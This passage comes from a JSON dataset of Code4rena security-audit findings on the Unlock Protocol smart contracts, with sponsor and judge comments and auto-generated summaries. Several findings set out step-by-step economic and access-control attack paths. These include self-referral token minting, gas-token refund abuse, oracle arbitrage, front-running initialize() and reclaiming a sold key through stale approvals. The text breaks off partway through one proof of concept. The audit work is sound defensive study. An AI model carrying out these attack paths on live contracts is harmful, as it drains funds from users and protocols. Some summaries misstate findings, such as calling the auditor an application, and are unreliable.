transferring more time than the `from` account has, the credited time is scaled down wrongly and the receiver receives less time (a larger fee is applied).\n\n#### Recommended Mitigation Steps\n\nIt should change the first `if` branch condition to `timePlusFee <= timeRemaining` (less than or equal).\nIn the `else` branch, it should compute the time without fee as `time = BASIS_POINTS_DEN * timeRemaining / (transferFeeBasisPoints + BASIS_POINTS_DEN)`.\n\n**[julien51 (Unlock Protocol) confirmed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/165#issuecomment-991683180):**\n > Great find!\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `MixinTransfer.shareKey` function. The function is intended to calculate a fee such that `time + fee * time == timeRemaining (timePlusFee)`. However, if the time remaining is less than the computed fee time, the computation changes and a different formula is applied. This results in the receiver receiving less time than they are owed.\n\nThe impact of this bug is that when transferring more time than the `from` account has, the credited time is scaled down wrongly and the receiver receives less time (a larger fee is applied).\n\nThe recommended mitigation steps are to change the first `if` branch condition to `timePlusFee <= timeRemaining` (less than or equal). In the `else` branch, it should compute the time without fee as `time = BASIS_POINTS_DEN * timeRemaining / (transferFeeBasisPoints + BASIS_POINTS_DEN)`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/165",
      "tags": [],
      "finders": [
        "cmichel",
        "0x0x0x"
      ]
    },
    {
      "id": "1085",
      "title": "[M-09] Referrer discount token amount can be manipulated",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `Unlock.recordKeyPurchase` function is called on each key purchase (`MixinPurchase.purchase`) and mints UDT tokens to the referrer.\nThe amount to mint is based on the transaction's gas price which is controlled by the caller (purchaser):\n\n```solidity\nuint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;\n```\n\n#### Impact\n\nTokens can be minted by purchasing a key with themself as the referrer at a high transaction gas price.\nDepending on the UDT price on external markets, it could be profitable to buy a key at a high gas price, receive UDT and then sell them on a market for a profit.\n\n#### Recommended Mitigation Steps\n\nThe amount minted should be more predictable and not depend on the user's gas price input.\nConsider declaring an *average gas price* storage variable that is set by a trusted party and use this one instead.\n\n**[julien51 (Unlock Protocol) disagreed with severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/155#issuecomment-991691106):**\n > > Depending on the UDT price on external markets, it could be profitable to buy a key at a high gas price, receive UDT and then sell them on a market for a profit.\n> \n> Since we get the token price from the Uniswap oracle, the amount of tokens received is always at most equal to what they would have spent to acquire them on Uniswap.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/155#issuecomment-1013842955):**\n > As the uniswap oracle provides averaged price data, if there is any discrepancy between the spot price and the TWAP price, this can definitely be abused to extract value from the protocol. Keeping this as `medium`.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Unlock.recordKeyPurchase` function. This function is called on each key purchase and mints UDT tokens to the referrer. The amount of tokens minted depends on the transaction's gas price, which is controlled by the caller (purchaser). This vulnerability means that tokens can be minted by purchasing a key with themself as the referrer at a high transaction gas price. Depending on the UDT price on external markets, it could be profitable to buy a key at a high gas price, receive UDT and then sell them on a market for a profit.\n\nThe recommended mitigation step is to declare an average gas price storage variable that is set by a trusted party and use this one instead of the user's gas price input. This would make the amount minted more predictable and would reduce the risk of exploit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/155",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1084",
      "title": "[M-08] Frontrunning PublicLock.initialize() can prevent upgrades due to insufficient access control",
      "impact": "MEDIUM",
      "content": "## Handle\n\nelprofesor\n\n\n## Vulnerability details\n\n## Impact\nThe unlock protocols base contract `Unlock.sol` uses `setLocktemplate()` to initialize the implementation contract for the `PublicLock` proxy. This function will initialize the relevant `PublicLock` contract which has been deployed separately. `PublicLock.initialize()` does not have any relevant access control and does not prevent arbitrary users from initialising. This means that a malicious user could front run the `setLocktemplate()` forcing the deployer of `PublicLock`'s implementation to redeploy. The process can be repeated, which costs the malicious user less than it would the owner of the Unlock Protocol, potentially unnecessarily draining funds from the development team.\n\n## Proof of Concept\n[Lack of access control on initialize](https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/PublicLock.sol#L42-L51)\n\n## Recommended Mitigation Steps\nImplement valid access control on the PublicLock contract to ensure only the relevant deployer can `initialize()`.",
      "summary": "\nThis bug report is about a vulnerability in the Unlock Protocol base contract `Unlock.sol` which uses `setLocktemplate()` to initialize the implementation contract for the `PublicLock` proxy. The vulnerability is that the `PublicLock.initialize()` function does not have any relevant access control and does not prevent arbitrary users from initialising. This means that a malicious user could front run the `setLocktemplate()` forcing the deployer of `PublicLock`'s implementation to redeploy. The process can be repeated, which costs the malicious user less than it would the owner of the Unlock Protocol, potentially unnecessarily draining funds from the development team.\n\nTo mitigate the vulnerability, it is recommended to implement valid access control on the PublicLock contract to ensure only the relevant deployer can `initialize()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/132",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "elprofesor",
        "kenzo"
      ]
    },
    {
      "id": "1083",
      "title": "[M-07] MixinPurchase:shareKey allows to generate keys without purchasing",
      "impact": "MEDIUM",
      "content": "_Submitted by GiveMeTestEther, also found by kenzo_\n\nThe `shareKey` function allows a user to share some time with another user that doesn't already has/had a key and this generates a new key. This even allows the user to generate more keys than `\\_maxNumberOfKeys`.\n\nAttacker generates a lot of EOA addresses, buys a key, share the minimum necessary time with each address and in each \"sharing\" a new key gets generated. This allows cheaply to allocate alot of \"keys\" with out really purchasing them and a lot of user can't get a \"key\" because purchase has a modifier notSoldOut, that limits the max purchasable to \"keys\" to `maxNumberOfKeys`\n\n#### Proof of Concept\n\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\n\n#### Tools Used\n\nManual Analysis\n\n#### Recommended Mitigation Steps\n\n*   rethink the whole `shareKey` thingy,\n\n**[julien51 (Unlock Protocol) acknowledged and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/242#issuecomment-979648865):**\n > I am not sure this is a bug or even a risk. \n> Someone could actually achieve the same thing by purchasing keys at the full price and cancelling them immediately getting an almost full refund (or even full refund when there is a free trial) and could quickly get the lock to \"sell out\". \n> It is actually the case with any NFT project where there is a cap/limit to number of tokens and someone can easily \"Capture\" them all.\n> \n> One way to limit the impact for the lock manager would be to set a cancellation penalty AND a transfer fee.  \n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/242#issuecomment-1013834438):**\n > Nice find! While I understand what the sponsor is saying, this does seem like a valid way to deny a lock from selling membership to honest users.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/242#issuecomment-1068792488):**\n > Note that a lock manager can easily increase supply to mitigate that (and even could _delete_ existing keys/NFT to reduce the outstanding supply)\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/242#issuecomment-1075656944):**\n > While the lock manager can restore the contract to some valid state, this will still impact protocol availability, even in the short-term.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the shareKey function of a certain application. This vulnerability allows a user to generate more keys than the limit set by _maxNumberOfKeys. This means that attackers can generate a lot of EOA addresses, buy a key, and share the minimum necessary time with each address. This generates a new key, allowing attackers to cheaply allocate a lot of keys without actually purchasing them. This limits the maximum purchasable keys to maxNumberOfKeys. The proof of concept was done through manual analysis, and the recommended mitigation steps include rethinking the whole shareKey thingy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/242",
      "tags": [],
      "finders": [
        "kenzo",
        "GiveMeTestEther"
      ]
    },
    {
      "id": "1082",
      "title": "[M-06] Key transfer will destroy key if from==to",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo, also found by GiveMeTestEther and cmichel_\n\nIf calling `transferFrom` with `_from == _recipient`, the key will get destroyed (meaning the key will be set as expired and set the owner's key to be 0).\n\n#### Impact\n\nA key manager or approved might accidentally destroy user's token.\n\nNote: this requires user error and so I'm not sure if this is a valid finding.\nHowever, few things make me think that it is valid:\n\n*   Unlock protocol checks for transfer to 0-address, so some input validation is there\n*   Since other entities other than the owner can be allowed to transfer owner's token, it might be best to make sure such accidental mistake could not happen.\n*   This scenario manifests a unique and probably unintended behavior\n\n#### Proof of Concept\n\nBy following `transferFrom`'s execution:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L109:#L166>\nOne can see that in the case where `_from == _recipient` with a valid key:\n\n*   The function will deduct transfer fee from the key\n*   The function will incorrectly add more time to the key's expiration ([L151](https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L151))\n*   The function will expire and reset the key ([L155](https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinTransfer.sol#L155:#L158))\n\nTherefore, the user will lose his key without getting a refund.\n\n#### Recommended Mitigation Steps\n\nAdd a require statement in the beginning of `transferFrom`:\n`require(_from != _recipient, 'TRANSFER_TO_SELF');`\n\n**[julien51 (Unlock Protocol) confirmed](https://github.com/code-423n4/2021-11-unlock-findings/issues/87)**\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/87#issuecomment-1068792003):**\n > Fixed since then :)\n\n\n\n",
      "summary": "\nThis bug report is about the vulnerability of the Unlock protocol where a key manager or approved user might accidentally destroy a user's token if they call the `transferFrom` function with `_from == _recipient`. This requires user error and so it might not be a valid finding, however, the bug report notes that there is input validation and that this scenario manifests a unique and probably unintended behavior. The bug report provides a proof of concept which shows that if the `_from == _recipient` with a valid key, then the key will be deducted a transfer fee, have more time added to its expiration, and then be expired and reset. \n\nThe recommended mitigation step for this bug is to add a require statement in the beginning of `transferFrom`: `require(_from != _recipient, 'TRANSFER_TO_SELF');`. This statement will prevent the key from being destroyed if the `_from == _recipient` condition is met.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/87",
      "tags": [],
      "finders": [
        "GiveMeTestEther  cmichel",
        "kenzo"
      ]
    },
    {
      "id": "1081",
      "title": "[M-05] Refund mechanism doesn’t take into account that key price can change",
      "impact": "MEDIUM",
      "content": "## Handle\n\nkenzo\n\n\n## Vulnerability details\n\nLock manager can change key pricing.\nThe refund mechanism calculates refund according to current key price, not price actually paid.\n\n## Impact\nA user refunding can get less (or more) funds than deserved.\n\n## Proof of Concept\nRefund only takes the current price into account:\nhttps://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinRefunds.sol#L144:#L152\nLock manager can update key price at any point, and the old price is not saved anywhere:\nhttps://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinLockCore.sol#L183\nSo if for example a key price has gone down, a user who tried to refund will get less funds than deserved.\n\n## Recommended Mitigation Steps\nConsider saving the amount the user paid, and refund according to that.\nOr having a kind of a price snapshot/version mechanism.",
      "summary": "\nThis bug report is regarding the Lock Manager of a smart contract. The issue is that the refund mechanism calculates the refund according to the current key price, not the price actually paid by the user. This means that a user refunding can get less or more funds than they should have. The proof of concept provided in the report is that the refund only takes the current price into account and the lock manager can update the key price at any point, without saving the old price. The recommended mitigation steps are to either save the amount the user paid and refund according to that, or to have a price snapshot/version mechanism.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/53",
      "tags": [],
      "finders": [
        "WatchPug  0x0x0x",
        "kenzo"
      ]
    },
    {
      "id": "1080",
      "title": "[M-04] Key buyers will not be able to get refund if lock manager withdraws profits",
      "impact": "MEDIUM",
      "content": "_Submitted by kenzo_\n\nUnlock contains a feature in which a key buyer can ask for a refund.\nThe refund is sent from the lock - where the purchase funds were sent.\nThe lock manager can withdraw all funds from the lock.\nTherefore, if the lock manager withdraws enough profits from the lock, the user would not be able to cancel his key and request refund.\nEven if a lock manager is not malicious, if he would want to enable users to cancel their key, he would have to keep track of how much tokens need to be kept in the contract in order to enable this - not a trivial calculation. A naive lock manager might accidentally disable refunds for his clients.\n\n#### Impact\n\nRefunds are not guaranteed.\nA user might buy a key expecting to cancel it within some time, only to discover he can not cancel it. (This loss of user funds is why I consider this a high risk finding.)\nAn unaware lock manager who just wants to withdraw all his profits might accidentally discover that he removed his users' ability to cancel their key.\n\n#### Notes\n\nIt seems the Unlock team is aware to some extent that withdrawing breaks refunds, as they state in the `withdraw` function:\n\n       * TODO: consider allowing anybody to trigger this as long as it goes to owner anyway?\n       *  -- however be wary of draining funds as it breaks the `cancelAndRefund` and `expireAndRefundFor`\n       * use cases.\n\nHowever, even if just the owner is allowed to call it, he may break the refund functionality - on purpose or accidentally.\nLooking on Unlock documentation I don't see a warning to creators about withdrawing their funds.\n\n#### Proof of Concept\n\n`withdraw` function has no limit on the amount withdrawn, therefore the owner can withdraw all funds:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinLockCore.sol#L133:#L162>\n\n`cancelAndRefund` transfers the funds from the same lock contract:\n<https://github.com/code-423n4/2021-11-unlock/blob/main/smart-contracts/contracts/mixins/MixinRefunds.sol#L118>\nTherefore if there are not enough funds, the transfer will fail.\n\n#### Recommended Mitigation Steps\n\nPerhaps a sort of MasterChef-like shares system can be implemented in order to make sure the owner leaves enough funds in the lock to process refunds.\n\n**[julien51 (Unlock Protocol) disagreed with severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/50#issuecomment-976135073):**\n > As noted, this is actually documented. You are right though that we should make this more obvious on the UI.\n> I would not classify this as High Risk.\n\n**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/50#issuecomment-1013832438):**\n > Nice find! I think this can be downgraded to `medium` as the availability of the protocol is impacted by this issue.\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/50#issuecomment-1068791454):**\n > This would not affect the whole protocol but only the \"malicious\" lock and it is impractice not only documented but also how these things work in the real world. If Netflix went out of business tomorrow, I could not get a refund on this month's membership fee...\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/50#issuecomment-1075662850):**\n > While I mostly agree with the sponsor, this may be intended behaviour as user's should not be entitled to a refund in this case. However, based on what was known at the time, it seemed like this broke the functionality of `cancelAndRefund` and `expireAndRefundFor` functions, hence why it was marked as `medium` severity.\n\n\n\n",
      "summary": "\nThe bug report is about the Unlock feature which allows a key buyer to ask for a refund. The refund is sent from the lock where the purchase funds were sent, however the lock manager can withdraw all funds from the lock. This means that if the lock manager withdraws enough profits from the lock, the user would not be able to cancel his key and request a refund. The impact of this bug is that refunds are not guaranteed and a user might buy a key expecting to cancel it within some time, only to discover he can not cancel it. The Unlock team is aware to some extent that withdrawing breaks refunds, however, no warning is given to creators about withdrawing their funds. The proof of concept shows that the `withdraw` function has no limit on the amount withdrawn, so the owner can withdraw all funds. A recommended mitigation step is to implement a sort of MasterChef-like shares system to make sure the owner leaves enough funds in the lock to process refunds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/50",
      "tags": [],
      "finders": [
        "kenzo"
      ]
    },
    {
      "id": "1079",
      "title": "[M-03] Support of different ERC20 tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax, also found by cmichel, Reigada, kenzo, Ruhum, 0x0x0x, GiveMeTestEther, and WatchPug_\n\nThe current version of the codebase does not handle special cases of tokens, e.g. deflationary, rebasing, or those that return true/false on success (see: <https://github.com/d-xo/weird-erc20>). Function purchase transfers tokens from msg.sender but it does not check the return value, nor how many tokens were actually transferred:\n\n```solidity\n  token.transferFrom(msg.sender, address(this), pricePaid);\n```\n\n#### Recommended Mitigation Steps\n\nI have 2 suggestions here:\n\n1.  Use SafeERC20 library to handle token transfers: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol>\n2.  Consider checking the actual balances transferred (balance after-before) or clearly documenting that you do not support deflationary / rebasing / etc tokens.\n\n**[julien51 (Unlock Protocol) disputed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/221#issuecomment-991662738):**\n > The only party that would be penalized in the examples you describe is the lock manager (and beneficiary) who has explicitly deployed the lock using the (noncompliant) ERC20.\n> If we consider the threat model here then I think this is not really an issue, as additional checks would incur a gas cost for everyone.\n\n**Please note: the following additional discussions and re-assessment took place approximately 2 months after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.**\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/221#issuecomment-1068790582):**\n > The fact that this requires an explicit action by the lock manager (ie using a buggy/malicious ERC20 token) and that it puts only _their_ tokens at risk, I think this is `minor`.\n\n**[0xleastwood (judge) decreased severity to Low and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/221#issuecomment-1075664726):**\n > Giving this a bit more thought, I think its always safe to enforce these checks rather than leave it up to the lock manage to potentially make the mistake and then be liable for this mistake later on. However, considering the threat model, I do think this is better suited as a `low` severity issue.\n\n\n\n",
      "summary": "\nThe current version of the codebase does not properly handle special cases of tokens, such as deflationary, rebasing, or those that return true/false on success. Function purchase transfers tokens from msg.sender without checking the return value or the amount of tokens actually transferred. To mitigate this vulnerability, the OpenZeppelin SafeERC20 library should be used to handle token transfers and/or the actual balances transferred should be checked (balance after-before) or clearly document that the codebase does not support deflationary/rebasing tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/221",
      "tags": [],
      "finders": [
        "Reigada",
        "GiveMeTestEther",
        "pauliax",
        "cmichel",
        "Ruhum",
        "WatchPug",
        "0x0x0x",
        "kenzo"
      ]
    },
    {
      "id": "1078",
      "title": "[M-02] Potential economic attack on UDT grants to the referrer",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nIn the current implementation, `Unlock.sol#recordKeyPurchase()` will send `estimatedGasForPurchase * tx.gasprice` worth of UDT to the referrer.\n\n<https://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/Unlock.sol#L325-L325>\n\n```solidity\nuint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;\n```\n\nWe believe there are multiple potential economic attack vectors to exploit this.\n\nIf `estimatedGasForPurchase` is misconfigured to a higher amount than the actual avg gas cost for a purchase call, or future network upgrades make the actual gas cost become lower than the configured `estimatedGasForPurchase`, it can be exploited simply by creating a lock and call `purchase()` many times to mint UDT.\n\nEven if `estimatedGasForPurchase` is configured to an amount similar to the actual gas cost, a more sophisticated attack is still possible:\n\n#### Proof of Concept\n\nGiven:\n\n*   `estimatedGasForPurchase` is configured as `200,000`;\n*   The gas cost of a regular purchase call is about `200,000`.\n\nThe attacker can create a lock contract and set the token address to a special gas saving token, which will SELFDESTRUCT to get a gas refund on `transfer`.\n\nThe attacker can:\n\n1.  Mint gas saving token with gas price: `1 gwei`;\n2.  Call `purchase()` and use 48 contract slots with gas price: `1000 gwei`;\n\nTotal gas saved will be \\~0.8 ETH (or other native tokens, eg. BNB, MATIC). Therefore, the attacker will profit \\~0.8 ETH worth of UDT.\n\nSee: <https://gastoken.io/>\n\n#### Recommendation\n\nConsider setting a global daily upper limit of total UDT grants to referrers, plus, an upper limit for UDT minted per purchase.\n\n**[julien51 (Unlock Protocol) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/186#issuecomment-991673917):**\n > > If `estimatedGasForPurchase` is misconfigured to a higher amount than the actual avg gas cost for a purchase call, or future network upgrades make the actual gas cost become lower than the configured `estimatedGasForPurchase`, it can be exploited simply by creating a lock and call `purchase()` many times to mint UDT.\n> \n> Absolutely but considering the security model, the admin indeed have full control over the protocol. We are thinking about finding a mechanism to not hardcode gas spent but use the actual number eventually. When we do that we should consider the impact of things like gas-token (even though EIP1559 has probably made them mostly impractical?).\n> \n> At this point given that the gas spent is hardcoded, there is a de-facto cap on how much UDT they could earn (based on the token price).\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/186#issuecomment-1013811232):**\n > While I agree with the warden, there is potential for value extraction, however, it does require the admin to be unaware about upcoming network upgrades. \n> \n> As the sponsor has noted, they will be moving towards a dynamic `estimatedGasForPurchase` value, however, from the perspective of the c4 contest, this doesn't change the outcome of my decision.\n> \n > As the protocol may leak value based on certain network assumptions, I'll mark this as `medium` severity.\n > \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n**Please note: the following additional discussions and re-assessment took place approximately 2 months after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.**\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/186#issuecomment-1068789965):**\n > I don't think the protocl can \"leak\" value based on that.\n > The tokens that are used to compute GDP and distribute tokens have to be approved by the DAO (right now only USDC, DAI and BAT have been approved on mainnet, and only USDC on Polygon). I don't think the DAO would approve gas tokens givem that indeed they could result in leakage of UDT, so I think it is `minor`.\n\n**[0xleastwood (judge) decreased severity to Low and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/186#issuecomment-1075674165):**\n > Considering the sponsor's comments, I actually agree that this is less likely than initially stated. Similar to the `SafeERC20` issue, it isn't expected that gas saving tokens will be approved to compute and distribute `UDT` tokens. I'll downgrade this to `low`.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Unlock.sol#recordKeyPurchase() function of the WatchPug application. This vulnerability can be exploited by misconfiguring the estimatedGasForPurchase value, or by taking advantage of future network upgrades that make the actual gas cost lower than the configured estimatedGasForPurchase. An attacker can also create a lock contract with a special gas saving token, and use 48 contract slots with a high gas price to save gas and mint UDT. This bug report recommends setting a global daily upper limit of total UDT grants to referrers, plus an upper limit for UDT minted per purchase, to mitigate this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/186",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1077",
      "title": "[M-01] Unlock: free UDT arbitrage opportunity",
      "impact": "MEDIUM",
      "content": "_Submitted by itsmeSTYJ_\n\nUniswap v2 made oracle attacks much more expensive to execute (since it needs to be manipulated over X number of blocks) however its biggest drawback is that it reacts slow to price volatility (depends on how far back you look). Depending on a single oracle is still very risky and can be exploited given the correct conditions.\n\nAssuming the ideal conditions, it is possible to purchase many keys across many locks for the UDT token that is distributed to the referrer and sell them on some other exchanges where the price of UDT is higher; high enough such that the malicious user can still profit even after requesting for a refund (w/ or w/o a free trial).\n\n#### Proof of Concept\n\nThis exploit is made possible because of:\n\n*   the over dependency on a single price oracle\n*   UDT token distribution logic is flawed\n\nThe following assumptions has to be true for this attack to work:\n\n1.  price of UDT on an exchange is much higher than that from the price retrieved from the `uniswapOracle`.\n2.  Since the price retrieved by `udtOracle.updateAndConsult()` only updates once per day, it is slow to react to the volatility of UDT price movements.\n3.  Malicious user creates a lock and buys many keys across multiple addresses.\n4.  Malicious user sells these UDT tokens on the exchanges w/ the higher price.\n5.  Malicious user requests for a refund on the keys owned.\n6.  Repeat until it is no longer profitable i.e. price on other exchanges become close to parity with the price retrieved by the `uniswapOracle`.\n\n#### Recommended Mitigation Steps\n\n*   Use the average of multiple oracle sources so that the price of UDT tokens (from `Unlock.sol`'s PoV) reacts faster.\n*   UDT tokens distributed based on the duration of key ownership.\n\n**[julien51 (Unlock Protocol) disagreed with severity and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/70#issuecomment-1004137608):**\n > As you noted this is pretty theoretical and given that the amount of UDT minted is capped to the gas spent, the user will need to 1) purchase a LOT of keys and 2) cancel them all and 3) find an exchange where the price is significantly different. \n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/70#issuecomment-1010535323):**\n > Nice find!\n> \n> While, I do agree this is a difficult attack to perform, it is still a valid way of extracting value from the protocol. Hence, I believe this should be kept as `medium`.\n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/70#issuecomment-1068788560):**\n > We will mitigate this in an upcoming upgrade by moving to Uniswap v3 for our oracles. \n\n\n\n",
      "summary": "\nThis bug report is about an exploit related to Uniswap v2. It is possible for a malicious user to purchase many keys across many locks for the UDT token that is distributed to the referrer and sell them on some other exchanges where the price of UDT is higher. This is made possible because of the over dependency on a single price oracle and the flawed UDT token distribution logic. To mitigate this, it is recommended to use the average of multiple oracle sources so that the price of UDT tokens (from Unlock.sol's PoV) reacts faster and to base UDT token distribution on the duration of key ownership.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/70",
      "tags": [],
      "finders": [
        "itsmeSTYJ"
      ]
    },
    {
      "id": "1076",
      "title": "[H-04] Approvals not cleared after key transfer",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe locks implement three different approval types, see `onlyKeyManagerOrApproved` for an overview:\n\n*   key manager (map `keyManagerOf`)\n*   single-person approvals (map `approved`). Cleared by `_clearApproval` or `_setKeyManagerOf`\n*   operator approvals (map `managerToOperatorApproved`)\n\nThe `MixinTransfer.transferFrom` requires any of the three approval types in the `onlyKeyManagerOrApproved` modifier on the tokenId to authenticate transfers from `from`.\n\nNotice that if the `to` address previously had a key but it expired only the `_setKeyManagerOf` call is performed, which does not clear `approved` if the key manager was already set to 0:\n\n```solidity\nfunction transferFrom(\n  address _from,\n  address _recipient,\n  uint _tokenId\n)\n  public\n  onlyIfAlive\n  hasValidKey(_from)\n  onlyKeyManagerOrApproved(_tokenId)\n{\n  // @audit this is skipped if user had a key that expired\n  if (toKey.tokenId == 0) {\n    toKey.tokenId = _tokenId;\n    _recordOwner(_recipient, _tokenId);\n    // Clear any previous approvals\n    _clearApproval(_tokenId);\n  }\n\n  if (previousExpiration <= block.timestamp) {\n    // The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration\n    // An expired key is no longer a valid key, so the new tokenID is the sender's tokenID\n    toKey.expirationTimestamp = fromKey.expirationTimestamp;\n    toKey.tokenId = _tokenId;\n\n    // Reset the key Manager to the key owner\n    // @audit  doesn't clear approval if key manager already was 0\n    _setKeyManagerOf(_tokenId, address(0));\n\n    _recordOwner(_recipient, _tokenId);\n  }\n  // ...\n}\n\n// \nfunction _setKeyManagerOf(\n  uint _tokenId,\n  address _keyManager\n) internal\n{\n  // @audit-ok only clears approved if key manager updated\n  if(keyManagerOf[_tokenId] != _keyManager) {\n    keyManagerOf[_tokenId] = _keyManager;\n    _clearApproval(_tokenId);\n    emit KeyManagerChanged(_tokenId, address(0));\n  }\n}\n```\n\n#### Impact\n\nIt's possible to sell someone a key and then claim it back as the approvals are not always cleared.\n\n#### Proof Of Concept\n\n*   Attacker A has a valuable key (`tokenId = 42`) with an expiry date far in the future.\n*   A sets approvals for their second attacker controlled account A' by calling `MixinKeys.setApprovalForAll(A', true)`, which sets `managerToOperatorApproved[A][A'] = true`.\n*   A clears the key manager by setting it to zero, for example, by transferring it to a second account that does not have a key yet, this calls the above `_setKeyManagerOf(42, address(0));` in `transferFrom`\n*   A sets single-token approval to A' by calling `MixinKeys.approve(A', 42)`, setting `approved[42] = A'`.\n*   A sells the token to a victim V for a discount (compared to purchasing it from the Lock). The victim needs to have owned a key before which already expired. The `transferFrom(A, V, 42)` call sets the owner of token 42 to `V`, but does not clear the `approved[42] == A'` field as described above. 